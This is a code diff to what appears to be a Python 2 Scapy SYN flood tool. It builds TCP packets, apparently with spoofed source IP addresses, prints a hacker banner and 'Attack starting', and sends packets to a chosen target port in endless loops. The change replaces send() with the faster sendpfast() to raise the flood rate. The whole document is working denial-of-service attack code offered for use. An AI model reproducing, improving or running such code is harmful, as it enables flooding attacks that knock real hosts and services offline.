@@ -9,6 +9,7 @@ from definepacket_synflood import *
 import os
 import random
 
+
 hostname = socket.gethostname()
 yourIP = socket.gethostbyname(hostname)
 hostname = socket.gethostname()
@@ -29,10 +30,10 @@ if awnser_anonymizing in supcountries or awnser_anonymizing == 'all':
    print 'HaCkEr5pReMe'
    print ''
    print 'Attack starting'
-   while 0 == 0:
+   while 0 == 0:         
          Tcp_packet = setpacketinfotcp(targetport)
-         send(Ip_packet/Tcp_packet())
-
+         sendpfast(Ip_packet/Tcp_packet)
+   
 if awnser_anonymizing == yourIP:
    Ip_range = '192.168.0.2'
    Ip_packet = setpacketinfoip(Ip_range,destination)
@@ -40,9 +41,9 @@ if awnser_anonymizing == yourIP:
    print 'HaCkEr5pReMe'
    print ''
    print 'Attack starting'
-   while 0 == 0:
+   while 0 == 0:         
          Tcp_packet = setpacketinfotcp(targetport)
-         send(Ip_packet/Tcp_packet())
+         sendpfast(Ip_packet/Tcp_packet)
         
          
 
@@ -56,7 +57,7 @@ if type(awnser_anonymizing) == str and awnser_anonymizing != yourIP:
     print 'Attack starting'
     while 0 == 0:
          Tcp_packet = setpacketinfotcp(targetport)
-         send(Ip_packet/Tcp_packet())
+         sendpfast(Ip_packet/Tcp_packet)
 
 
 
